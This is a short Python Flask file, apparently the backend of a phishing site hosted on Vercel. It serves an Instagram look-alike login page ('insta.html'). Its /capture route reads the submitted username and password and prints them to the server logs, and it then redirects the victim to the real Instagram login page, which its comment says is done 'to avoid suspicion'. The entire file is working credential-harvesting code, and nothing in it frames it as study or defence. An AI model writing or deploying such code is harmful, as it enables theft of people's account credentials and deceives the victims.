# api/index.py
from flask import Flask, render_template, request, redirect
import os

# Initialize Flask app
app = Flask(__name__, template_folder='../templates')

# Main route to serve the phishing page
@app.route('/')
def index():
    return render_template('insta.html')

# Route to capture credentials
@app.route('/capture', methods=['POST'])
def capture():
    username = request.form['username']
    password = request.form['password']

    # IMPORTANT: Vercel's serverless environment is read-only.
    # You cannot write to a local file like 'captured_credentials.txt'.
    # The best way to "capture" data is to print it to the logs.
    print(f"!!! CAPTURED !!! Username: {username}, Password: {password}")

    # Redirect to the real Instagram to avoid suspicion
    return redirect("https://www.instagram.com/accounts/login/")

# Vercel needs this to import the app
def handler(request):
    return app